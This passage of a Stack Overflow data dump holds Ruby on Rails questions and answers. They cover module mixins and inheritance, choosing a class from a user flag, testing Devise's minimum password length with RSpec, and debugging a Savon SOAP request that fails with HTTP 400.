def talk\n    # baby talk\n  end\nend\n</code></pre>\n\n<p>What happens here is, Baby will inherit from Human , but when you call </p>\n\n<p><code>\nBaby.new.talk # =&gt; baby talk\n</code></p>\n\n<p>it execute the <code>talk</code> method in Baby class (not in the Human class)</p>\n\n<h2>Extracting the method to a module</h2>\n\n<p>Let's get a <code>Parrot</code> class, and assume that it has a <code>talk</code> method too, and also it's same as <code>Human talk</code>. </p>\n\n<p>Now the problem we have is we cannot inherit <code>Parrot</code> class from <code>Human</code>, but we still want to have the code in the <code>talk</code> method. In a case like that, you can use a Module, so, you can do </p>\n\n<pre><code>module Talkable\n  def talk\n    # talk like an adult\n  end\nend\n\nclass Human\n   include Talkable\nend\n\nclass Parrot\n  include Talkable\nend\n</code></pre>\n\n<p>As, as I explained (or at least tried..), your implementation will depend on how your class A,B,C and Message classes are related. </p>\n\n<p>What I personally do in situations like this is, get a pen and paper and try to map these objects without thinking about how to implement then in ruby or any language. Once you have an idea on how they all hang together, it's easy to find the syntax to implement it  </p>\n"}], "owner": {"reputation": 67, "user_id": 9732722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d51ae9bf08232bc377afdfc7671105e9?s=128&d=identicon&r=PG&f=1", "display_name": "Paco V.", "link": "https://stackoverflow.com/users/9732722/paco-v"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 217, "favorite_count": 0, "accepted_answer_id": 52031569, "answer_count": 2, "score": 0, "last_activity_date": 1535369094, "creation_date": 1535332181, "question_id": 52031451, "link": "https://stackoverflow.com/questions/52031451/rails-model-call-different-class-based-on-user-flag", "title": "Rails model call different class based on user flag", "body": "<p>Learning Rails, I just faced something where some lights could be helpful.</p>\n\n<p>I have the classes, A, B, C that all do an action.</p>\n\n<p>And I have a Message model and I would like, when I am going to save, to call one of those classes, based on the user output.</p>\n\n<p>I am struggling now on what would be the more rubyist way to write the code for the model but also the classes, depending on the model method.</p>\n\n<p>Option <strong>A</strong>:</p>\n\n<pre><code>case @user.flag:\n  when 'alpha'\n    A.new(message)\n  when 'beta'\n    B.new(message)\n  when 'gamma'\n    C.new(message)\n</code></pre>\n\n<p>Option <strong>B</strong>:\nMoving A,B,C from classes to user flag Instance methods of a Module called Functions</p>\n\n<pre><code>Functions.send(@user.flag.to_sym,message)\n</code></pre>\n\n<p>Since I have little knowledge of Rails, I am looking for how to write the most clean and reusable code. Thanks in advance.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rspec"], "comments": [{"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535335599, "post_id": 52031254, "comment_id": 91013849, "body": "I always use shoulda for testing validations, <code>it { should ensure_length_of(:password).is_at_least(size_of_password) }</code>"}, {"owner": {"reputation": 2080, "user_id": 1033737, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/iJ3qS.jpg?s=128&g=1", "display_name": "thefabbulus", "link": "https://stackoverflow.com/users/1033737/thefabbulus"}, "edited": false, "score": 1, "creation_date": 1535360503, "post_id": 52031254, "comment_id": 91021690, "body": "have you checked <a href=\"https://stackoverflow.com/questions/41836736/rails-5-devise-minimum-password-length-not-working\" title=\"rails 5 devise minimum password length not working\">stackoverflow.com/questions/41836736/&hellip;</a> ?"}, {"owner": {"reputation": 2080, "user_id": 1033737, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/iJ3qS.jpg?s=128&g=1", "display_name": "thefabbulus", "link": "https://stackoverflow.com/users/1033737/thefabbulus"}, "edited": false, "score": 0, "creation_date": 1535360585, "post_id": 52031254, "comment_id": 91021740, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/13111328/testing-password-length-validation-with-rspec\">Testing password length validation with RSpec</a>"}], "answers": [{"comments": [{"owner": {"reputation": 167, "user_id": 10034680, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fac2f173884d186d88e7f7c8b951f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Rattiku", "link": "https://stackoverflow.com/users/10034680/rattiku"}, "edited": false, "score": 0, "creation_date": 1535339102, "post_id": 52031767, "comment_id": 91014415, "body": "and if I want to use shoulda?"}, {"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "reply_to_user": {"reputation": 167, "user_id": 10034680, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fac2f173884d186d88e7f7c8b951f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Rattiku", "link": "https://stackoverflow.com/users/10034680/rattiku"}, "edited": false, "score": 0, "creation_date": 1535358162, "post_id": 52031767, "comment_id": 91020524, "body": "@Rattiku Did my solution work for you or are you facing the same issue ?"}], "tags": [], "owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "is_accepted": false, "score": 0, "last_activity_date": 1535340355, "last_edit_date": 1535340355, "creation_date": 1535335870, "answer_id": 52031767, "question_id": 52031254, "link": "https://stackoverflow.com/questions/52031254/rspec-ignores-min-length-of-a-password-specified-in-devise/52031767#52031767", "title": "Rspec ignores min length of a password specified in Devise", "body": "<p>If you don't want to use <code>shoulda</code>, can you try doing this</p>\n\n<pre><code>describe User do\n  it \"should validate the length of password\" do\n    FactoryGirl.build(:user, password: \"aaaaa\").should_not be_valid\n  end\nend\n</code></pre>\n\n<p>or if you want to use <code>shoulda</code></p>\n\n<pre><code>it { should ensure_length_of(:password).is_at_least(8) }\n</code></pre>\n\n<p>and if you want to check for max length,</p>\n\n<pre><code>it { should ensure_length_of(:password).is_at_most(18) }\n</code></pre>\n\n<hr>\n"}], "owner": {"reputation": 167, "user_id": 10034680, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fac2f173884d186d88e7f7c8b951f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Rattiku", "link": "https://stackoverflow.com/users/10034680/rattiku"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 88, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535445677, "creation_date": 1535329671, "last_edit_date": 1535445677, "question_id": 52031254, "link": "https://stackoverflow.com/questions/52031254/rspec-ignores-min-length-of-a-password-specified-in-devise", "title": "Rspec ignores min length of a password specified in Devise", "body": "<p>In the config of Devise I have the password min length to be 8. </p>\n\n<pre><code># config/initializers/devise.rb\n\nconfig.password_length = 8..128\n</code></pre>\n\n<p>However, my rspec <strong>test passes</strong> when a password 4 characters:</p>\n\n<pre><code>u = User.new({\n  password: \"test\",\n  # ....\n})\n\nexpect(u).to be_valid\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "savon"], "comments": [{"owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "edited": false, "score": 0, "creation_date": 1535312633, "post_id": 52029439, "comment_id": 91009716, "body": "Add a <code>log_level: :debug</code> option when you create the client, it should provide more info. Also, copy how you do the request with postman too to compare. You should inspect the request in both cases and look for diferences."}, {"owner": {"reputation": 1513, "user_id": 5746504, "user_type": "registered", "accept_rate": 91, "profile_image": "https://lh6.googleusercontent.com/-4c57-sWfrFM/AAAAAAAAAAI/AAAAAAAACog/XNKIq-S6CDg/photo.jpg?sz=128", "display_name": "Moamen Naanou", "link": "https://stackoverflow.com/users/5746504/moamen-naanou"}, "edited": false, "score": 0, "creation_date": 1535348236, "post_id": 52029439, "comment_id": 91016319, "body": "You don&#39;t need to use <code>soap_header</code> as per the posted envelop content, so try to remove it. Check here: <a href=\"http://savonrb.com/version2/globals.html\" rel=\"nofollow noreferrer\">savonrb.com/version2/globals.html</a>"}], "answers": [{"tags": [], "owner": {"reputation": 2285, "user_id": 2039726, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1fc7ff9bf8f9489ab7715282a9b7e9c?s=128&d=identicon&r=PG", "display_name": "MrShemek", "link": "https://stackoverflow.com/users/2039726/mrshemek"}, "is_accepted": false, "score": 0, "last_activity_date": 1535376850, "creation_date": 1535376850, "answer_id": 52040634, "question_id": 52029439, "link": "https://stackoverflow.com/questions/52029439/invalid-soap-request-needs/52040634#52040634", "title": "invalid SOAP request needs", "body": "<p>I think that the problem is related to the request body that you are building.</p>\n\n<p>Since you have a working example, I would start by checking the request's body build by savon. To do this, use the following code:</p>\n\n<pre><code> ops = client.operation(:get_active_employees_info)\n puts ops.build(message: {\"AppID\" =&gt; \"*******\",\"Username\" =&gt; \"*****\",\"Password\" =&gt; \"******\"}).pretty\n</code></pre>\n\n<p>Then, compare generated message with the one from Postman. I hope it helps.</p>\n"}], "owner": {"reputation": 583, "user_id": 1845041, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/eab0b3b808d2a07d6ae6f144ce5f2390?s=128&d=identicon&r=PG", "display_name": "Gagan", "link": "https://stackoverflow.com/users/1845041/gagan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 157, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535376850, "creation_date": 1535310470, "question_id": 52029439, "link": "https://stackoverflow.com/questions/52029439/invalid-soap-request-needs", "title": "invalid SOAP request needs", "body": "<p>I'm using savon to make requests against a SOAP service. </p>\n\n<p>Regardless, I'm having trouble making Savon client call. </p>\n\n<p>below mentioned are my ruby code</p>\n\n<pre><code>client = Savon.client(\n    wsdl: \"https://&lt;URL&gt;\",\n    soap_header: { 'Content-Type:' =&gt; \"text/xml\"},\n    log: true,    \n    pretty_print_xml: true\n)\n\nclient.call(:get_active_employees_info,:xmlns =&gt;\"http://tempuri.org/\") do\n  message(\"AppID\" =&gt; \"*******\",\"Username\" =&gt; \"*****\",\"Password\" =&gt; \"******\")\nend\n</code></pre>\n\n<p>which return </p>\n\n<pre><code>Savon::HTTPError: HTTP error (400)\n</code></pre>\n\n<p>but same snippets run on Postman</p>\n\n<pre><code>&lt;soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\"&gt;\n  &lt;soap12:Body&gt;\n    &lt;GetActiveEmployeesInfo xmlns=\"http://tempuri.org/\"&gt;\n      &lt;AppID&gt;**********&lt;/AppID&gt;\n      &lt;Username&gt;********&lt;/Username&gt;\n      &lt;Password&gt;**********&lt;/Password&gt;\n    &lt;/GetActiveEmployeesInfo&gt;\n  &lt;/soap12:Body&gt;\n&lt;/soap12:Envelope&gt;\n</code></pre>\n"}]